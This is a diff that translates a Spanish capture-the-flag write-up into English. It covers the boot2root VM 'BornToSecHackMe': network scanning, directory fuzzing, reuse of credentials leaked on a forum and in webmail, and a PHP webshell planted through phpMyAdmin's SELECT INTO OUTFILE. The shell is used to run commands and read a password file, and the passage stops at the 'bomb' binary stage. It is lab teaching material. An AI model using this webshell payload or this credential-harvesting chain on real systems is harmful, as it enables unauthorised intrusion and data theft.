@@ -1,45 +1,44 @@
-# Writeup 1 - Raiders of the Lost Ark (En busca del arca perdida)
+# Writeup 1 - Raiders of the Lost Ark
 
-## Índice:
+## Index:
 
-- [1. Encontrar la IP](#1-encontrar-la-ip)
-- [1.1 Encontrar la IP en el campus](#11-encontrar-la-ip-en-el-campus)
-- [2. Reconocimiento de servicios](#2-reconocimiento-de-servicios)
-- [3. Explorar el servidor web](#3-explorar-el-servidor-web)
-- [4. Fuzzing paths de acceso](#4-fuzzing-paths-de-acceso)
-- [5. Explorando el foro](#5-explorando-el-foro)
-- [6. Logging en el foro](#6-logging-en-el-foro)
-- [7. Iniciar sesión en Phpmyadmin](#7-iniciar-sesión-en-phpmyadmin)
-- [8. Acceso SSH como laurie](#8-acceso-ssh-como-laurie)
-- [9. Análisis del binario y assword exploit](#9-análisis-del-binario-y-passwords-exploit)
-- [10. Ejecutamos el binario bomb](#10-ejecutamos-el-binario-bomb)
-- [11. Acceso SSH como thor](#11-acceso-ssh-como-thor)
+- [1. Find the IP address](#1-find-the-ip-address)
+- [1.1 Finding the IP address on campus](#11-finding-the-ip-address-on-campus)
+- [2. Recognition of services](#2-recognition-of-services)
+- [3. Explore the web server](#3-explore-the-web-server)
+- [4. Fuzzing access paths](#4-fuzzing-access-paths)
+- [5. Exploring the forum](#5-exploring-the-forum)
+- [6. Logging into the forum](#6-logging-into-the-forum)
+- [7. Log in to phpMyAdmin](#7-log-in-to-phpmyadmin)
+- [8. SSH access as laurie](#8-ssh-access-as-laurie)
+- [9. Binary Analysis and Passwords Exploit](#9-binary-analysis-and-passwords-exploit)
+- [10. We execute the bomb binary](#10-we-execute-the-bomb-binary)
+- [11. SSH access as Thor](#11-ssh-access-as-thor)
 - [12. Python Draw](#12-python-draw)
 - [13. Acceso SSH como zaz](#13-acceso-ssh-como-zaz)
-- [14. Calcular el offset y payload](#14-calcular-el-offset-y-payload)
-- [15. Construir el payload](#15-construir-el-payload)
-- [16. Conclusión del Writeup 1](#16-conclusión-del-writeup-1)
+- [14. Calculate the offset](#14-calculate-the-offset)
+- [15. Build the payload](#15-build-the-payload)
+- [16. Writeup 1 Conclusion](#16-writeup-1-conclusion)
 
 
-## Explotación
+## Exploitation
 
-## 1. Encontrar la IP
+## 1. Find the IP address
 
-> Ten en cuenta que esta sección puede variar según la configuración de tu red.
+> Please note that this section may vary depending on your network configuration.
 
-Listamos la VM que está corriendo en el host:
-
+We list the VM that is running on the host:
 ```bash
 VBoxManage list runningvms
 "boot2root" {656d8bc0-eeee-4e29-93b6-574bfd23da96}
 ```
 
-Intentamos que nos muestre la configuración de red pero no devuelve nada:
+We tried to get it to show us the network configuration but it returned nothing:
 ```bash
 VBoxManage showvminfo boot2root | grep -i network
 ```
 
-Así que intentamos ver los adaptadores de red configurados y encontramos una información clave `Attachment: Bridged Interface 'wlo1'`:
+So we tried to view the configured network adapters and found a key piece of information: `Attachment: Bridged Interface 'wlo1'`:
 
 ```bash
 VBoxManage showvminfo "boot2root" | grep -i "nic\|nat\|bridge\|host"
@@ -56,9 +55,9 @@ Name: 'vmbox_share', Host path: '/home/davgalle/Escritorio/VM_TRANSFER' (global 
     Destination:             File
 ```
 
-`wlo1` es nuestra interfaz `WiFi`. Con `Bridged` la VM está en la misma red que nuetro host. Eso significa que tiene una IP en el mismo rango que nosotros.
+`wlo1` is our `WiFi` interface. With `Bridged`, the VM is on the same network as our host. That means it has an IP address in the same range as us.
 
-Usamos el comando `ip addr show wlo1` y separamos todo lo que necesitamos:
+We use the command `ip addr show wlo1` and separate everything we need:
 ```bash
 ip addr show wlo1
 3: wlo1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
@@ -71,18 +70,18 @@ ip addr show wlo1
 ```
 
 ```text
-Nuetra IP:      192.168.0.19
-Rango:          192.168.0.0/24 
+Our IP:      192.168.0.19
+Range:       192.168.0.0/24 
 ```
 
-La VM está en el mismo rango. Puesto que com es posibel que no dispongamos de `nmap`,  usamos una función en bash para escanear las IP:
+The VM is in the same range. Since we don't have `nmap` on campus, we use a bash function to scan the IPs:
 ```bash
  for i in {1..254}; do 
   (ping -c 1 -W 1 192.168.0.$i | grep "from" | cut -d " " -f 4 | tr -d ":" &) 
 done; wait
 192.168.0.1             ←  // router
 192.168.0.12
-192.168.0.19            ←  // Nuestra IP
+192.168.0.19            ←  // Our IP
 192.168.0.25
 192.168.0.17
 192.168.0.26
@@ -90,13 +89,13 @@ done; wait
 192.168.0.30
 192.168.0.10
 ```
-Descartamos las IP `192.168.0.19` y `192.168.0.1`, que son la nuestra y la del router. Creamos una función en `bash` para escanear las IP restantes en busca de los puertos abiertos y esto nos devuelve la IP `192.168.0.30` que tiene varios puertos abiertos:
+We discarded the IPs `192.168.0.19` and `192.168.0.1`, which are ours and the router's. We created a function in `bash` to scan the remaining IPs for open ports, and this returned the IP `192.168.0.30`, which has several open ports:
 
 ```bash
 for ip in 10 12 17 25 26 27 30; do
     echo "--- IP 192.168.0.$ip ---"
     for port in 21 22 25 80 443 3306; do
-        (timeout 0.5 bash -c "echo > /dev/tcp/192.168.0.$ip/$port" 2>/dev/null) && echo "[+] Puerto $port abierto"
+        (timeout 0.5 bash -c "echo > /dev/tcp/192.168.0.$ip/$port" 2>/dev/null) && echo "[+] Port $port open"
     done
 done
 --- IP 192.168.0.10 ---
@@ -104,47 +103,46 @@ done
 --- IP 192.168.0.17 ---
 --- IP 192.168.0.25 ---
 --- IP 192.168.0.26 ---
-[+] Puerto 443 abierto
+[+] Port 443 open
 --- IP 192.168.0.27 ---
-[+] Puerto 443 abierto
+[+] Port 443 open
 --- IP 192.168.0.30 ---
-[+] Puerto 21 abierto
-[+] Puerto 22 abierto
-[+] Puerto 80 abierto
-[+] Puerto 443 abierto
+[+] Port 21 open
+[+] Port 22 open
+[+] Port 80 open
+[+] Port 443 open
 ```
 
-## 1.1 Encontrar la IP en el campus
+## 1.1 Finding the IP address on campus
 
-La red del campus es `10.12.0.0/16`. Obtenemos primero la MAC de la VM:
+The campus network is `10.12.0.0/16`. We first obtain the VM's MAC address:
 
 ```bash
 VBoxManage showvminfo "boot2root" | grep -i "mac"
 NIC 1: MAC: 0800278C3C22, Attachment: Bridged Interface 'enp4s0f0'
 ```
 
-La MAC `0800278C3C22` se formatea con dos puntos: `08:00:27:8c:3c:22`.
+The MAC address `0800278C3C22` is formatted with a colon: `08:00:27:8c:3c:22`.
 
-Las VMs de boot2root en 42 Madrid siempre están en el rango `10.12.200.x`.
-Escaneamos ese rango buscando la VM por su MAC en la tabla ARP:
+The boot2root VMs in Madrid are always in the `10.12.200.x` range. We scanned this range, searching for the VM by its MAC address in the ARP table:
 
 ```bash
 for i in {1..254}; do
   bash -c "echo > /dev/tcp/10.12.200.$i/22" 2>/dev/null
   result=$(arp -n | grep "08:00:27:8c:3c:22")
   if [ -n "$result" ]; then
-    echo "VM encontrada: $result"
+    echo "VM found: $result"
     break
   fi
 done
-VM encontrada: 10.12.200.13    ether   08:00:27:8c:3c:22   C   enp4s0f0
+VM found: 10.12.200.13    ether   08:00:27:8c:3c:22   C   enp4s0f0
 ```
 
-La IP de la VM en el campus es `10.12.200.13`.
+The IP address of the VM on campus is `10.12.200.13`.
 
-## 2. Reconocimiento de servicios
+## 2. Recognition of services
 
-Con la IP identificada exploramos los servicios disponibles en los puertos abiertos:
+With the identified IP address, we explore the services available on the open ports:
 
 **Puerto 80 — HTTP:**
 ```bash
@@ -155,7 +153,7 @@ Last-Modified: Wed, 07 Oct 2015 23:37:54 GMT
 Content-Type: text/html
 ```
 
-El servidor web es **Apache 2.2.22** corriendo sobre **Ubuntu**.
+The web server is **Apache 2.2.22** running on **Ubuntu**.
 
 **Puerto 22 — SSH:**
 ```bash
@@ -164,9 +162,9 @@ Connection to 192.168.0.30 22 port [tcp/*] succeeded!
 SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7
 ```
 
-La versión de SSH es **OpenSSH 5.9p1** — versión antigua con posibles vulnerabilidades conocidas.
+The SSH version is **OpenSSH 5.9p1** — an older version with known potential vulnerabilities.
 
-**Puerto 22 — Banner SSH:**
+**Port 22 — Banner SSH:**
 ```bash
 ssh -p 22 192.168.0.30
 The authenticity of host '192.168.0.30 (192.168.0.30)' can't be established.
@@ -185,20 +183,20 @@ Warning: Permanently added '192.168.0.30' (ECDSA) to the list of known hosts.
 davgalle@192.168.0.30's password: 
 ```
 
-El servidor pide credenciales que aun no tenemos.
+The server is asking for credentials that we don't yet have.
 
-**Resumen del servidor:**
+**Server Summary:**
 
-| Puerto | Servicio | Versión |
+| Port | Service | Version |
 | --- | --- | --- |
 | 21 | FTP | ? |
 | 22 | SSH | OpenSSH 5.9p1 |
 | 80 | HTTP | Apache 2.2.22 |
 | 443 | HTTPS | Apache 2.2.22 |
 
-## 3. Explorar el servidor web
+## 3. Explore the web server
 
-Exploramos `https` en el terminal y recibimos `404 Not Found`. Aunque parece que hay algo configurado pero no encuentra el recurso raíz.:
+We explored `https` in the terminal and received `404 Not Found`. It seems something is configured, but it can't find the root resource.
 ```bash
 davgalle@davgalle-Latitude-5400:~/Documents/RNCP7/boot2root$ curl -kI https://192.168.0.30
 HTTP/1.1 404 Not Found
@@ -208,11 +206,11 @@ Vary: Accept-Encoding
 Content-Type: text/html; charset=iso-8859-1
 ```
 
-Exploramos `http` en el navegador y nuestra una página de "coming soon" aparentemente vacia:
+We explored `http` in the browser and found a seemingly empty "coming soon" page:
 
 ![HTTP index](img/http_index.png)
 
-Exploramos el código fuente de `http` en busca de **directorios ocultos** y no vemos nada fuera de lo normal ni directorios ocultos. Los **enlaces son reales**.   
+We explored the source code of `http` looking for **hidden directories** and found nothing out of the ordinary. The **links are real**.   
 ```bash
  curl http://192.168.0.30
 <!DOCTYPE html>
@@ -238,17 +236,17 @@ Exploramos el código fuente de `http` en busca de **directorios ocultos** y no 
 </html>
 ```
 
-Como sabemos que el servidor es Apache.  En Apache hay algunos archivos y directorios que existen por defecto o son muy comunes en cualquier servidor web:
+Since we know the server is Apache, there are some files and directories in Apache that exist by default or are very common on any web server:
 
-- `robots.txt` — le dice a los buscadores qué no indexar
-- `sitemap.xml` — mapa del sitio
-- `.htaccess` — configuración de Apache
-- `server-status` — estado del servidor
+- `robots.txt` — tells search engines what not to index
+- `sitemap.xml` — site map
+- `.htaccess` — Apache configuration file
+- `server-status` — server status
 
-Probamos con todos en el puerto `80` y el `443` y no encontramos nada de información importante salvo por un detalle:
+We tried all of them on ports `80` and `443` and didn't find any important information except for one detail:
 
-- `curl http://192.168.0.30/.htaccess` -> Devuelve `403`
-- `curl -k https://192.168.0.30/.htaccess` -> Devuelve `404`
+- `curl http://192.168.0.30/.htaccess` -> Returns `403`
+- `curl -k https://192.168.0.30/.htaccess` -> Returns `404`
 
 ```bash
 curl http://192.168.0.30/.htaccess
@@ -276,21 +274,19 @@ curl -k https://192.168.0.30/.htaccess
 </body></html>
 ```
 
-Esta variación significa que en `HTTPS` la configuración es diferente al `HTTP`.
+This variation means that the configuration in `HTTPS` is different from `HTTP`.
 
-Los certificados SSL autofirmados a veces revelan nombres de dominio, emails o información del servidor en los campos:
+Self-signed SSL certificates sometimes reveal domain names, emails, or server information in the following fields:
 
 ```bash
 openssl s_client -connect 192.168.0.30:443 2>/dev/null | openssl x509 -noout -text | grep Subject
 Subject: CN = BornToSec
 Subject Public Key Info:
 ```
-El certificado SSL es **autofirmado** y revela el nombre `CN = BornToSec` —
-el mismo nombre que aparece en el prompt de login de la VM. Esto sugiere que
-hay un **virtual host** configurado con ese nombre en Apache.
+The SSL certificate is **self-signed** and reveals the name `CN = BornToSec` —
+the same name that appears in the VM's login prompt. This suggests that there is a virtual host configured with that name in Apache.
 
-Sin acceso a `/etc/hosts` en el campus, pasamos el header `Host` directamente
-con `curl` para forzar la resolución del virtual host:
+Without access to `/etc/hosts` on campus, we pass the `Host` header directly using `curl` to force resolution of the virtual host:
 
 ```bash
 curl -k -H "Host: BornToSec" https://192.168.0.30/
@@ -298,26 +294,25 @@ HTTP/1.1 404 Not Found
 address>Apache/2.2.22 (Ubuntu) Server at borntosec Port 443
 ```
 
-El servidor responde como `borntosec` (en minúsculas) — confirma que el virtual
-host existe. Probamos los mismos archivos comunes pero sin resultado.
+The server responds as `borntosec` (lowercase) — confirming that the virtual host exists. We tried the same common files but without success.
 
-**Resumen final del reconocimiento:**
+**Final Summary of the Reconnaissance:**
 
-| Puerto | Servicio | Versión | Notas |
+| Port | Service | Version | Notes |
 | --- | --- | --- | --- |
-| 21 | FTP | vsftpd | Anónimo configurado pero con error de permisos |
-| 22 | SSH | OpenSSH 5.9p1 | Versión antigua — pide credenciales |
-| 80 | HTTP | Apache 2.2.22 | Página "coming soon" — `.htaccess` existe (403) |
-| 443 | HTTPS | Apache 2.2.22 | Virtual host `borntosec` — certificado autofirmado |
+| 21 | FTP | vsftpd | Anonymous configured but with permissions error |
+| 22 | SSH | OpenSSH 5.9p1 | Older version — asks for credentials |
+| 80 | HTTP | Apache 2.2.22 | "Coming soon" page — `.htaccess` exists (403) |
+| 443 | HTTPS | Apache 2.2.22 | Virtual host `borntosec` — self-signed certificate |
 
 
-## 4. Fuzzing paths de acceso
+## 4. Fuzzing access paths
 
-Una vez que el reconocimiento está completo exploramos los directorios sin el comando `dirb` porque no se encuentra instalado en el campus. Creamos un `script bash` con los directorios más comunes de las webs.
+Once the reconnaissance is complete, we explore the directories without the `dirb` command because it's not installed on campus. We create a bash script with the most common website directories.
 
-las wordlists más comunes están en `/usr/share/wordlists/` en Kali o similares.
+The most common wordlists are located in `/usr/share/wordlists/` in Kali or similar systems.
 
-Primero escaneamos en `HTTP`:
+First, we scan for HTTP:
 
 ```bash
 for dir in admin login wp-admin phpmyadmin forum blog uploads files backup webmail tmp test; do
@@ -328,7 +323,7 @@ done
 404 http://192.168.0.30/login/
 404 http://192.168.0.30/wp-admin/
 404 http://192.168.0.30/phpmyadmin/
-403 http://192.168.0.30/forum/        ← existe pero bloqueado
+403 http://192.168.0.30/forum/        ← It exists but it's blocked.
 404 http://192.168.0.30/blog/
 404 http://192.168.0.30/uploads/
 404 http://192.168.0.30/files/
@@ -338,9 +333,9 @@ done
 404 http://192.168.0.30/test/
 ```
 
-Descubrimos que la VM es un servidor Linux con varios servicios, y que el directorio `/forum/` devuelve `403` en HTTP — existe pero está bloqueado.
+We discovered that the VM is a Linux server with several services, and that the `/forum/` directory returns `403` on HTTP—it exists but is blocked.
 
-Repetimos el escaneo en `HTTPS`:
+We repeated the scan on `HTTPS`:
 
 ```bash
 for dir in admin login wp-admin phpmyadmin forum blog uploads files backup webmail tmp test; do
@@ -350,64 +345,64 @@ done
 404 https://192.168.0.30/admin/
 404 https://192.168.0.30/login/
 404 https://192.168.0.30/wp-admin/
-200 https://192.168.0.30/phpmyadmin/  ← panel de bases de datos
-200 https://192.168.0.30/forum/       ← foro accesible
+200 https://192.168.0.30/phpmyadmin/  ← database panel
+200 https://192.168.0.30/forum/       ← accessible forum
 404 https://192.168.0.30/blog/
 404 https://192.168.0.30/uploads/
 404 https://192.168.0.30/files/
 404 https://192.168.0.30/backup/
-302 https://192.168.0.30/webmail/     ← redirección al cliente de correo
+302 https://192.168.0.30/webmail/     ← redirection to email client
 404 https://192.168.0.30/tmp/
 404 https://192.168.0.30/test/
 ```
 
-Descubrimos tres servicios accesibles en `HTTPS`:
+We discovered three services accessible via HTTPS:
 
-| Directorio | Código | Servicio |
+| Directory | Code | Service |
 | --- | --- | --- |
 | `/forum/` | 200 | Foro **"my little forum 2.3.4"** |
-| `/webmail/` | 302 | Cliente de correo web (SquirrelMail) |
-| `/phpmyadmin/` | 200 | Panel de administración de bases de datos |
+| `/webmail/` | 302 | Webmail client (SquirrelMail) |
+| `/phpmyadmin/` | 200 | Database administration panel |
 
-Lo probamos en el navegador `https://192.168.0.30/forum/`, nos muetra la página del foro y vemos que podemos extraer información muy importante.
+We tested it in the browser `https://192.168.0.30/forum/`, it shows us the forum page and we see that we can extract very important information.
 
 ![HTTPS forum](img/https_forum.png)
 
-## 5. Explorando el foro
+## 5. Exploring the forum
 
-El foro es **"my little forum 2.3.4"**. Observando la página extraemos información muy valiosa porque los usuarios registrados al pie de página conincide con los nombres en los hilos:
+The forum is **"my little forum 2.3.4"**. We read and see that the number of registered users is the same as the number of visible names on the forum. This is very valuable information:
 
-**6 usuarios registrados:**
+**6 registered users:**
 
-| Usuario | Rol |
+| User | Rol |
 | --- | --- |
-| `admin` | Administrador |
-| `lmezard` | Usuario |
-| `qudevide` | Usuario |
-| `zaz` | Usuario |
-| `wandre` | Usuario |
-| `thor` | Usuario |
+| `admin` | Admin |
+| `lmezard` | User |
+| `qudevide` | User |
+| `zaz` | User |
+| `wandre` | User |
+| `thor` | User |
 
-**Hilos publicados:**
+**Threads posted:**
 
-| ID | Título | Autor |
+| ID | Tittle | Autor |
 | --- | --- | --- |
 | 1 | Welcome to this new Forum ! | `admin` |
 | 6 | Probleme login ? | `lmezard` |
 | 4 | Gasolina | `qudevide` |
 | 2 | Les mouettes ! | `wandre` |
 
-El hilo más interesante es **"Probleme login ?"** publicado por `lmezard`. Puede contener credenciales o pistas de acceso.
+The most interesting thread is **"Login Problem?"** posted by `lmezard`. It may contain credentials or login clues.
 
-Después de revisar todo el hilo **"Probleme login ?"** encontramos un registro de un error de inicio de sesión, en el que parece el típico error en el que el usuario a puesto el password `!q\]Ej?*5K5cy*AJ` en el campo del usuario.
+After reviewing the entire **"Login Problem?"** thread, we found a login error log, which appears to be the typical error where the user entered the password `!q\]Ej?*5K5cy*AJ` in the username field.
 
-## 6. Logging en el foro
+## 6. Logging into the forum
 
-Y más abajo el usuario `lmezard` se loguea correctamente:
+And further down, the user `lmezard` logs in successfully:
 
 ![HTTPS password](img/password.png)
 
-Probamos a logueranos en el blog en el navegador con las credenciales que hemos encontrado:
+We tried logging into the blog in the browser with the credentials we found:
 
 ![HTTPS back](img/back.png)
 
@@ -415,19 +410,19 @@ Probamos a logueranos en el blog en el navegador con las credenciales que hemos 
 
 ![HTTPS back](img/loging_02.png)
 
-¡¡¡Y ya estamos dentro!!!
+And we're in!!!
 
 ![HTTPS back](img/loging_03.png)
 
 
-Buscando en el perfil del usuairo descubrimos su email `laurie@borntosec.net`. Y con esa información descubrimos dos cosas:
+Looking through the user's profile, we discovered their email address, `laurie@borntosec.net`. And with that information, we discovered two things:
 
 ![HTTPS back](img/mail_01.png)
 
-- El nombre real de `lmezard` es `Laurie`
-- El dominio es `borntosec.net` (que coincide con el virtual host borntosec que encontramos antes) 
+- The real name of `lmezard` is `Laurie`
+- The domain is `borntosec.net` (which matches the borntosec virtual host we found earlier)
 
-Ahora que tenemos su cuenta de correo vamos a probar a loguearnos en `webmail`.
+Now that we have their email account, let's try logging into `webmail`.
 ```text
 https://192.168.0.30/webmail
 ```
@@ -436,9 +431,9 @@ https://192.168.0.30/webmail
 
 ![HTTPS back](img/webmail_02.png)
 
-La cuenta solo tiene un par de E-mails, y abrimos directamente el que tiene como `Subject: DB Access`
+The account only has a couple of emails, and we'll open the one with "Subject: DB Access" directly.
 
-Dentro de ese correo encontramos las credenciales para acceder a la Base de Datos:
+Inside that email, we'll find the credentials to access the database.
 
 ```text
 Hey Laurie,
@@ -451,28 +446,28 @@ Best regards.
 - Username: root
 - Password: Fg-'kKXBj87E:aJ$
 
-## 7. Iniciar sesión en Phpmyadmin
+## 7. Log in to phpMyAdmin
 
-Accedemos a `phpmyadmin` que se encuetra en la dirección `https://192.168.0.30/phpmyadmin/` tal y como vimos en la búsqueda de directorios:
+We access `phpmyadmin` which is located at the address `https://192.168.0.30/phpmyadmin/` as we saw in the directory search:
 
 ![HTTPS phpmyadmin](img/phpmyadmin.png)
 
 
-Vamos a intentar abrir una `shell` en la VM inyectando una nueva página `php` en el foro, para que este ejecute todos los comandos que le pasemos.
+We're going to try opening a shell in the VM by injecting a new PHP page into the forum, so that it can execute all the commands we pass it.
 
-## **Estos son los pasos que hemos seguido:**
+## **These are the steps we followed:**
 
-- [7.1 Inyectando un webshell](#71-inyectando-un-webshell)
-- [7.2 Acceder al terminal como www-data](#72-acceder-al-terminal-como-www-data)
-- [7.3 Acceso al FTP](#73-acceso-al-ftp)
-- [7.4 Reensamblar archivo TAR](#74-reensamblar-archivo-tar)
-- [7.5 Cruzamos datos](#75-cruzamos-datos)
+- [7.1 Injecting a webshell](#71-injecting-a-webshell)
+- [7.2 Access the terminal as www-data](#72-access-the-terminal-as-www-data)
+- [7.3 FTP Access](#73-ftp-access)
+- [7.4 Reassemble TAR file](#74-reassemble-tar-file)
+- [7.5 We cross-reference data](#75-we-cross-reference-data)
 
-### 7.1 Inyectando un webshell
+### 7.1 Injecting a webshell
 
-Usamos `phpMyAdmin` para escribir un archivo `PHP` directamente en el servidor usando `SQL`.
+We use `phpMyAdmin` to write a `PHP` file directly to the server using `SQL`.
 
-Desde el `home` de `phpmyadmin` vamos a la pestaña de `SQL` y ejecutamos este comnado:
+From the `phpMyAdmin` home page, go to the `SQL` tab and run this command:
 ```bash
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
 ```
@@ -480,16 +475,16 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c
 
 ![HTTPS phpmyadmin](img/phpmyadmin_01.png)
 
-El archivo se ha creado y podeoms acceder a él:
+The file has been created and we can access it:
 
 ```bash
 curl -k "https://192.168.0.30/forum/templates_c/shell.php?cmd=whoami"
 www-data
 ```
 
-### 7.2 Acceder al terminal como www-data
+### 7.2 Access the terminal as www-data
 
-Tenemos ejecución de comandos en el servidor como `www-data`. Ahora exploramos el sistema de archivos en busca de información útil:
+We have command execution on the server like `www-data`. Now we explore the file system for useful information:
 
 ```bash
 curl -k "https://192.168.0.30/forum/templates_c/shell.php?cmd=ls+/home/"
@@ -502,28 +497,28 @@ thor
 zaz
 ```
 
-Buscamos dentro del direcotirio `LOOKATME`que nos muetra el archivo `password`:
+We are inside the `LOOKATME` directory which shows us the `password` file:
 ```bash
 curl -k "https://192.168.0.30/forum/templates_c/shell.php?cmd=ls+/home/LOOKATME"
 password
 ```
 
-Hacmeos un `cat` para que no muestre que contiene ese archivo:
+We use `cat` to prevent it from showing that it contains the file:
 ```bash
 curl -k "https://192.168.0.30/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password"
 lmezard:G!@M6f4Eatau{sF"
 ```
 
-- Usuario: lmezard
+- User: lmezard
 - Password: G!@M6f4Eatau{sF"
 
-### 7.3 Acceso al FTP
+### 7.3 FTP Access
 
-El archivo `/home/LOOKATME/password` contiene credenciales con formato **`usuario:contraseña`**. 
+The file `/home/LOOKATME/password` contains credentials in the format **`username:password`**.
 
-El usuario es `lmezard` — el mismo del foro.
+The username is `lmezard` — the same as the forum user.
 
-Probamos esas credenciales en el `FTP` porque es el único servicio que nos quedaba por explorar con credenciales y que sabíamos que estaba activo **(puerto 21 abierto desde el inicio)**.
+We tested these credentials on the FTP server because it was the only service we hadn't yet explored with credentials and that we knew was active **(port 21 open from the start)**.
 
 ```bash
 ftp 192.168.0.30
@@ -543,7 +538,7 @@ ftp> ls
 226 Directory send OK.
 ```
 
-Encontramos dos archivos — `README` y `fun`. Los descargamos con `get`:
+We found two files — `README` and `fun`. We downloaded them with `get`:
 
 ```bash
 ftp> get README
@@ -551,30 +546,30 @@ ftp> get fun
 ftp> quit
 ```
 
-El `README` nos da las instrucciones del siguiente paso:
+The `README` gives us the instructions for the next step:
 
 ```bash
 cat README
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
 
-El archivo `fun` es un archivo `TAR` con 751 fragmentos de código C desordenados. Hay que reensamblarlos en orden para obtener la contraseña de `laurie`.
+The file `fun` is a `TAR` archive containing 751 jumbled snippets of C code. These snippets must be reassembled in order to obtain the password for `laurie`.
 
-### 7.4 Reensamblar archivo TAR
+### 7.4 Reassemble TAR file
 
-Cada fragmento tiene un número de archivo en el comentario `//fileN`.
+Each fragment has a file number in the comment `//fileN`.
 
-El `main()` llama a `getme1()` hasta `getme12()` y dice **"Now SHA-256 it and submit"**.
+The `main()` function calls `getme1()` through `getme12()` and then says **"Now SHA-256 it and submit"**.
 
-Podemos ver algunos valores en el archivo:
+We can see some values ​​in the file:
 
 ```bash
-getme1()  → file5   → char getme1() {  → buscar el return
-getme2()  → file414 → char getme2() {  → buscar el return
-getme4()  → file66  → char getme4() {  → buscar el return
-getme5()  → file633 → char getme5() {  → buscar el return
-getme6()  → file91  → char getme6() {  → buscar el return
-getme7()  → file366 → char getme7() {  → buscar el return
+getme1()  → file5   → char getme1() {  → search for the return
+getme2()  → file414 → char getme2() {  → search for the return
+getme4()  → file66  → char getme4() {  → search for the return
+getme5()  → file633 → char getme5() {  → search for the return
+getme6()  → file91  → char getme6() {  → search for the return
+getme7()  → file366 → char getme7() {  → search for the return
 getme8()  → 'w'
 getme9()  → 'n'
 getme10() → 'a'
@@ -582,7 +577,7 @@ getme11() → 'g'
 getme12() → 'e'
 ```
 
-Y además tenemos algunos **returns** visibles:
+And we also have some visible **returns**:
 
 ```bash
 file38  → ZPY1Q.pcap → return 'h'   ← getme?
@@ -594,7 +589,7 @@ file371 → ECOW1.pcap → return 'e'   ← getme?
 file86  → APM1E.pcap → return 'I'   ← getme?
 ```
 
-Extraemos al archivo y buscamos los `getme` que nos falta:
+We extract the file and look for the missing `getme` files:
 ```bash
 tar xf fun
 grep -r "return" ft_fun/ | grep -v "useless\|printf"
@@ -612,7 +607,7 @@ ft_fun/J5LKW.pcap:	return 't';
 ft_fun/T7VV0.pcap:	return 'r';
 ```
 
-Ahora uqe tenemos todos los returns, tenemos que asignarlos a las funciones correctas buscando qué `getme` corresponde a cada archivo:
+Now that we have all the returns, we need to assign them to the correct functions by finding which `getme` corresponds to each file:
 ```bash
 grep -r "getme" ft_fun/ | grep -v "useless\|printf" 
 ft_fun/BJPCP.pcap:char getme8() {
@@ -629,9 +624,9 @@ ft_fun/B62N4.pcap:char getme3() {
 ft_fun/0T16C.pcap:char getme4() {
 ```
 
-### 7.5 Cruzamos datos
+### 7.5 We cross-reference data
 
-cada `getme` está en un archivo, y el `return` está en el archivo siguiente (el código está fragmentado). Buscamos el return que sigue a cada `getme`:
+Each `getme` statement is in one file, and the `return` statement is in the next file (the code is fragmented). We look for the return statement that follows each `getme` statement:
 ```bash
 grep -A2 "getme1\b" ft_fun/331ZU.pcap
 grep -A2 "getme2\b" ft_fun/G7Y8I.pcap
@@ -664,9 +659,9 @@ char getme7() {
 
 ```
 
-Veos como cada `getme` está incompleto. Por lo tanto el `return` está en el archivo con el número siguiente.
+We see that each `getme` is incomplete. Therefore, the `return` is in the file with the following number.
 
-Buscamos los archivos por número de fichero:
+We search for files by file number:
 ```bash
 grep -r "//file6$" ft_fun/
 grep -r "//file38$" ft_fun/
@@ -684,7 +679,7 @@ ft_fun/J5LKW.pcap://file522
 ft_fun/T44J5.pcap://file737
 ```
 
-Y ahora ya podemos cruzar todos los datos:
+And now we can cross-reference all the data:
 ```bash
 getme1()  → file5  → siguiente es file6  → APM1E.pcap  → return 'I'
 getme2()  → file37 → siguiente es file38 → ZPY1Q.pcap  → return 'h'
@@ -700,19 +695,19 @@ getme11() → BJPCP.pcap → return 'g'
 getme12() → BJPCP.pcap → return 'e'
 ```
 
-**La contraseña es:** 
+**The password is:**
 - Iheartpwnage
 
-El `main()` dice **"Now SHA-256 it and submit"**. Calculamos:
+The `main()` says **"Now SHA-256 it and submit"**. We calculate:
 ```bash
  echo -n "Iheartpwnage" | sha256sum
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
 ```
 
 
-## 8. Acceso SSH como laurie
+## 8. SSH access as laurie
 
-Usamos la contraseña y el usuario para acceder a VM a traves del `SSH`:
+We use the username and password to access the VM via SSH:
 
 ```bash
 ssh laurie@192.168.0.30
@@ -730,7 +725,7 @@ laurie
 laurie@BornToSecHackMe:~$ 
 ```
 
-Una vez que estamos dentro listamos el `home`
+Once we are inside, we list the `home`
 ```bash
 laurie@BornToSecHackMe:~$ ls -la
 total 37
@@ -746,16 +741,16 @@ drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
 -rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
 ```
 
-Leemos el archivo `READNE` y ejecutamos `bomb`  que nos da las pistas de lo que tenemos que hacer:
+We read the `README` file and run `bomb` which gives us clues about what we need to do:
 ```bash
 laurie@BornToSecHackMe:~$ ./bomb 
 Welcome this is my little bomb !!!! You have 6 stages with
 only one life good luck !! Have a nice day!
 ```
-### **Instrucciones de bomb:**
-- El binario `bomb` se compone de 6 etapas
-- Cada etapa requiere de un password para acceder a la siguiente fase
-- Si ponemos un password mal, hará saltar la bomba.
+### **Bomb Instructions:**
+- The `bomb` binary consists of 6 stages
+- Each stage requires a password to access the next stage
+- If we enter an incorrect password, it will trigger the bomb.
 
 ```bash
 laurie@BornToSecHackMe:~$ cat README 
@@ -772,30 +767,29 @@ o
 
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
-### **Pistas del README:**
+### **README Clues:**
 
-Cuando tengas todas las contraseñas, úsalas como usuario `thor` con `ssh`.
+Once you have all the passwords, use them as the user `thor` with `ssh`.
 
-Las letras y números del README son pistas parciales que se confirman tras
-analizar cada etapa del binario con GDB:
+The letters and numbers in the README are partial clues that are confirmed after analyzing each stage of the binary with GDB:
 
-- `P`  → la etapa 1 acepta una frase que empieza por `P`
-- `2`  → la etapa 2 acepta una secuencia que contiene el número `2`
-- `b`  → la etapa 3 tiene una solución que contiene la letra `b`
